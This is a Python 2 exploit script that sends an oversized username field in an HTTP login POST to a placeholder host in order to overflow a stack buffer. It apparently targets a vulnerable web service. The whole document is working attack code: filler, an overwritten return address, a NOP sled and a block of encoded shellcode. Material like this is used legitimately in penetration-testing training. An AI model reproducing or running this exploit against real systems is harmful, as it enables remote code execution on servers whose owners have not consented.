#!/usr/bin/python
import socket
try:
    shellcode = ("\xbf\xef\xd1\x2f\xc5\xd9\xf7\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x0e\x03\x92\xdf\xcd\x30\x90\x08\x93"
"\xbb\x68\xc9\xf4\x32\x8d\xf8\x34\x20\xc6\xab\x84\x22\x8a\x47"
"\x6e\x66\x3e\xd3\x02\xaf\x31\x54\xa8\x89\x7c\x65\x81\xea\x1f"
"\xe5\xd8\x3e\xff\xd4\x12\x33\xfe\x11\x4e\xbe\x52\xc9\x04\x6d"
"\x42\x7e\x50\xae\xe9\xcc\x74\xb6\x0e\x84\x77\x97\x81\x9e\x21"
"\x37\x20\x72\x5a\x7e\x3a\x97\x67\xc8\xb1\x63\x13\xcb\x13\xba"
"\xdc\x60\x5a\x72\x2f\x78\x9b\xb5\xd0\x0f\xd5\xc5\x6d\x08\x22"
"\xb7\xa9\x9d\xb0\x1f\x39\x05\x1c\xa1\xee\xd0\xd7\xad\x5b\x96"
"\xbf\xb1\x5a\x7b\xb4\xce\xd7\x7a\x1a\x47\xa3\x58\xbe\x03\x77"
"\xc0\xe7\xe9\xd6\xfd\xf7\x51\x86\x5b\x7c\x7f\xd3\xd1\xdf\xe8"
"\x10\xd8\xdf\xe8\x3e\x6b\xac\xda\xe1\xc7\x3a\x57\x69\xce\xbd"
"\x98\x40\xb6\x51\x67\x6b\xc7\x78\xac\x3f\x97\x12\x05\x40\x7c"
"\xe2\xaa\x95\xd3\xb2\x04\x46\x94\x62\xe5\x36\x7c\x68\xea\x69"
"\x9c\x93\x20\x02\x37\x6e\xa3\xed\x60\x07\x82\x86\x72\xe7\xe5"
"\xed\xfa\x01\x8f\x01\xab\x9a\x38\xbb\xf6\x50\xd8\x44\x2d\x1d"
"\xda\xcf\xc2\xe2\x95\x27\xae\xf0\x42\xc8\xe5\xaa\xc5\xd7\xd3"
"\xc2\x8a\x4a\xb8\x12\xc4\x76\x17\x45\x81\x49\x6e\x03\x3f\xf3"
"\xd8\x31\xc2\x65\x22\xf1\x19\x56\xad\xf8\xec\xe2\x89\xea\x28"
"\xea\x95\x5e\xe5\xbd\x43\x08\x43\x14\x22\xe2\x1d\xcb\xec\x62"
"\xdb\x27\x2f\xf4\xe4\x6d\xd9\x18\x54\xd8\x9c\x27\x59\x8c\x28"
"\x50\x87\x2c\xd6\x8b\x03\x5c\x9d\x91\x22\xf5\x78\x40\x77\x98"
"\x7a\xbf\xb4\xa5\xf8\x35\x45\x52\xe0\x3c\x40\x1e\xa6\xad\x38"
"\x0f\x43\xd1\xef\x30\x46")

    print "\nSending evil buffer..."
    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10
    inputBuffer = filler + eip + offset + nops + shellcode
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: *IP*\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
    buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://*IP*/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("*IP*", 80))
    s.send(buffer)
    s.close()
    print "\nDone!"
except:
    print "\nCould not connect!"
